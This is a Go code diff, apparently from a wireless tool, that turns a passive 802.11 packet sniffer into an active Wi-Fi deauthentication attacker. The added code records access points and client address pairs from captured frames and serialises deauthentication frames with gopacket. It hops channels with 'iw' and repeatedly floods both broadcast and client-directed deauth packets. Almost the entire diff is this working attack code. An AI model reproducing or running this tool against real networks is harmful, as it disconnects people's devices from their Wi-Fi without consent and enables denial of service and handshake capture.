@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"os"
 	"strings"
 	"sync"
 	"time"
@@ -17,8 +18,15 @@ var noiseList []string = []string{"ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00", "33:
 
 type AP struct {
 	SSID    string
-	BSSID   string
+	BSSID   net.HardwareAddr
 	Channel byte
+}
+
+type Client struct {
+	Addr1     net.HardwareAddr
+	Addr2     net.HardwareAddr
+	APSSID    string
+	APChannel byte
 }
 
 type APManager struct {
@@ -26,16 +34,143 @@ type APManager struct {
 	APMap   map[string]AP
 
 	ClientMutex sync.Mutex
-	ClientsList []string
+	ClientsMap  map[string]Client
 
 	DefaultChannel byte
+	MaxChannels    int
+	MonIface       string
+	BroadcastMac   net.HardwareAddr
+	WriteHandle    *pcap.Handle
 }
 
-func NewAPManager() *APManager {
+func NewAPManager(monIface string, handle *pcap.Handle) *APManager {
+	bMac := []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
+	bAddr := net.HardwareAddr(bMac)
+
 	return &APManager{
 		APMutex:        sync.Mutex{},
+		ClientMutex:    sync.Mutex{},
 		APMap:          make(map[string]AP),
+		ClientsMap:     make(map[string]Client),
 		DefaultChannel: 6,
+		MaxChannels:    10,
+		MonIface:       monIface,
+		BroadcastMac:   bAddr,
+		WriteHandle:    handle,
+	}
+}
+
+func (a *APManager) createPacket(addr1 net.HardwareAddr, addr2 net.HardwareAddr, addr3 net.HardwareAddr, seq uint16) []byte {
+	var serOptions = gopacket.SerializeOptions{
+		FixLengths:       true,
+		ComputeChecksums: true,
+	}
+
+	buf := gopacket.NewSerializeBuffer()
+	err := gopacket.SerializeLayers(
+		buf, serOptions,
+		&layers.RadioTap{},
+		&layers.Dot11{
+			Address1:       addr1,
+			Address2:       addr2,
+			Address3:       addr3,
+			Type:           layers.Dot11TypeMgmtDeauthentication,
+			SequenceNumber: seq,
+		},
+		&layers.Dot11MgmtDeauthentication{
+			Reason: layers.Dot11ReasonClass2FromNonAuth,
+		},
+	)
+
+	if err != nil {
+		log.Fatalf("failed to serialize deauth packet: %s", err.Error())
+	}
+
+	return buf.Bytes()
+}
+
+func (a *APManager) deauth(ch byte) {
+
+	if len(a.APMap) == 0 && len(a.ClientsMap) == 0 {
+		log.Println("no APs and client devices to attack")
+	}
+
+	if len(a.ClientsMap) > 0 {
+		a.ClientMutex.Lock()
+
+		for clientKey := range a.ClientsMap {
+			client := a.ClientsMap[clientKey]
+			if ch == client.APChannel {
+				log.Printf("directing attack at addr1=%s, add2=%s AP=%s", client.Addr1, client.Addr2, client.APSSID)
+				for i := 0; i < 100; i++ {
+					pack1 := a.createPacket(client.Addr1, client.Addr2, client.Addr2, uint16(i))
+					// pack2 := a.createPacket(client.Addr2, client.Addr1, client.Addr1, uint16(i))
+
+					// send packet
+					a.WriteHandle.WritePacketData(pack1)
+					time.Sleep(10 * time.Millisecond)
+
+					// a.WriteHandle.WritePacketData(pack2)
+					// time.Sleep(10 * time.Millisecond)
+				}
+			}
+		}
+
+		a.ClientMutex.Unlock()
+	}
+
+	if len(a.APMap) > 0 {
+		a.APMutex.Lock()
+
+		for apKey := range a.APMap {
+			ap := a.APMap[apKey]
+			if ch == ap.Channel {
+				log.Printf("broadcasting attack at AP=%s", ap.SSID)
+				for i := 0; i < 100; i++ {
+					pack1 := a.createPacket(a.BroadcastMac, ap.BSSID, ap.BSSID, uint16(i))
+					a.WriteHandle.WritePacketData(pack1)
+					time.Sleep(10 * time.Millisecond)
+				}
+			}
+		}
+
+		a.APMutex.Unlock()
+	}
+}
+
+func (a *APManager) startAttack() {
+	// iterate over all the channels:
+	// for the first time, it just dry runs
+	dryRun := true
+	currentAttackChannel := 0
+	for {
+
+		currentAttackChannel = (currentAttackChannel + 1) % a.MaxChannels
+		if currentAttackChannel == 0 {
+			if dryRun {
+				log.Println("finished dry-run, starting attack...")
+				dryRun = false
+			}
+			currentAttackChannel = 1
+		}
+
+		// use this channel
+		_, iError := ExecCommand("iw", "dev", a.MonIface, "set", "channel", fmt.Sprintf("%d", currentAttackChannel))
+		if iError != nil {
+			log.Fatalf("failed to set attack channel: %s", iError.Error())
+			os.Exit(InterfaceCommandError)
+		}
+
+		if dryRun {
+			time.Sleep(1 * time.Second)
+		} else {
+			time.Sleep(100 * time.Millisecond)
+		}
+
+		if !dryRun {
+			log.Printf("launching attack from channel %d", currentAttackChannel)
+			a.deauth(byte(currentAttackChannel))
+		}
 	}
 }
 
@@ -49,13 +184,54 @@ func (a *APManager) isNoise(addr1 string, addr2 string) bool {
 	return false
 }
 
-func (a *APManager) addAPList(bssid string, packet gopacket.Packet) {
+func (a *APManager) addClient(addr1 net.HardwareAddr, addr2 net.HardwareAddr) {
+	a.APMutex.Lock()
+	defer a.APMutex.Unlock()
+
+	a.ClientMutex.Lock()
+	defer a.ClientMutex.Unlock()
+
+	addr1Str := addr1.String()
+	addr2Str := addr2.String()
+
+	clKey := fmt.Sprintf("%s::%s", addr1Str, addr2Str)
+	_, ok := a.ClientsMap[clKey]
+	if ok {
+		return
+	}
+
+	client := Client{Addr1: addr1, Addr2: addr2, APChannel: a.DefaultChannel}
+
+	hasAP := false
+
+	if ap, addr1Ok := a.APMap[addr1Str]; addr1Ok {
+		client.APSSID = ap.SSID
+		client.APChannel = ap.Channel
+		hasAP = true
+	} else if ap, addaddr2Ok := a.APMap[addr2Str]; addaddr2Ok {
+		client.APSSID = ap.SSID
+		client.APChannel = ap.Channel
+		hasAP = true
+	}
+
+	// add this client
+	if hasAP {
+		a.ClientsMap[clKey] = client
+		log.Printf(
+			"added new client addr1=%s, addr2=%s, ap_bssid=%s, channel=%d",
+			client.Addr1.String(), client.Addr2.String(), client.APSSID, client.APChannel,
+		)
+	}
+}
+
+func (a *APManager) addAPList(bssid net.HardwareAddr, packet gopacket.Packet) {
 
 	a.APMutex.Lock()
 	defer a.APMutex.Unlock()
 
+	bssidStr := bssid.String()
 	// BSSID already in map?
-	_, ok := a.APMap[bssid]
+	_, ok := a.APMap[bssidStr]
 	if ok {
 		return
 	}
@@ -76,8 +252,8 @@ func (a *APManager) addAPList(bssid string, packet gopacket.Packet) {
 
 	ap.BSSID = bssid
 
-	log.Printf("adding new AP with BSSID: %s, SSID: %s on channel: %d", ap.BSSID, ap.SSID, ap.Channel)
-	a.APMap[bssid] = ap
+	log.Printf("adding new AP with BSSID: %s, SSID: %s on channel: %d", bssidStr, ap.SSID, ap.Channel)
+	a.APMap[bssidStr] = ap
 }
 
 func (a *APManager) CheckAndParseDot11(packet gopacket.Packet) {
@@ -85,8 +261,8 @@ func (a *APManager) CheckAndParseDot11(packet gopacket.Packet) {
 	if dot11Layer != nil {
 		// we found a dot11 packet
 		dot11Packet := dot11Layer.(*layers.Dot11)
-		addr1 := strings.ToLower(dot11Packet.Address1.String())
-		addr2 := strings.ToLower(dot11Packet.Address2.String())
+		addr1 := dot11Packet.Address1
+		addr2 := dot11Packet.Address2
 
 		// is this access point already in the list?
 		// the probe response originate from AP as a response to client probe
@@ -96,24 +272,22 @@ func (a *APManager) CheckAndParseDot11(packet gopacket.Packet) {
 
 		if dot11Probe != nil || dot11Beacon != nil {
 			// get all necessary details:
-			addr3 := strings.ToLower(dot11Packet.Address3.String())
+			addr3 := dot11Packet.Address3
 			a.addAPList(addr3, packet)
 		}
 
-		if a.isNoise(addr1, addr2) {
+		if a.isNoise(addr1.String(), addr2.String()) {
 			return
 		}
 
-		// management packets, these packets will be used by clients to communicate
-		// management related information with APs
-		// log.Printf("found dot11 packet: %v", dot11Packet)
+		a.addClient(addr1, addr2)
 	}
 }
 
 var apManager *APManager = nil
 
 func ListenForPacketsOnIface(iface *net.Interface) *InternalError {
-	handle, err := pcap.OpenLive(iface.Name, 4096, false, 30*time.Second)
+	readHandle, err := pcap.OpenLive(iface.Name, 1024, false, pcap.BlockForever)
 	if err != nil {
 		return &InternalError{
 			Status:  PcapHandleError,
@@ -121,12 +295,21 @@ func ListenForPacketsOnIface(iface *net.Interface) *InternalError {
 		}
 	}
 
-	apManager = NewAPManager()
+	writeHandle, err := pcap.OpenLive(iface.Name, 1024, false, pcap.BlockForever)
+	if err != nil {
+		return &InternalError{
+			Status:  PcapHandleError,
+			Message: fmt.Sprintf("failed to open pcacp handle: %s", err.Error()),
+		}
+	}
+
+	apManager = NewAPManager(iface.Name, writeHandle)
 	log.Println("initialized Aaccess points manager")
 
-	pcapSource := gopacket.NewPacketSource(handle, handle.LinkType())
+	pcapSource := gopacket.NewPacketSource(readHandle, readHandle.LinkType())
 
 	log.Printf("created pcap source, waiting for Dot11 packets on %s", iface.Name)
+	go apManager.startAttack()
 	for packet := range pcapSource.Packets() {
 		apManager.CheckAndParseDot11(packet)
 	}
